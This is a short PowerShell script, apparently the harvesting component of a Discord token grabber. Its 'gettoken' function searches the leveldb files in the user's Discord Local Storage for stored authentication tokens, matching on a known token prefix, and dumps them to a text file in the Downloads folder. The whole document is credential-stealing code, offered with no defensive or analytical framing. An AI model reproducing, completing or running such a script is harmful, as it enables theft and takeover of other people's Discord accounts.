function gettoken 
{
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$decryptkey
    )

    $discordPath = $env:APPDATA+"\discord"
    $storagePath = "\Local Storage\leveldb"

    $result=""
    $stable = $discordPath+$storagePath
    if ( Test-Path -LiteralPath $stable ) {
        Set-Location $stable
        $files = @(Get-ChildItem *.ldb)
        Foreach ($file in $files) {
            $file = Get-Content -Path $file
            $rickrolllink = "dQw4w9WgXcQ"
            $endofdctoken = '=="'
            $pattern = "$rickrolllink(.*?)$endofdctoken"
            $newestoken = [regex]::Match($file,$pattern).Groups[1].Value+'=='
            if ($newestoken.StartsWith(":")) {
                $newestoken = $newestoken.Replace(":", "")
                $result = $result+$newestoken
            }
        }
    }
    return $result
}

gettoken > "C:\Users\$env:username\Downloads\cumcum.txt"
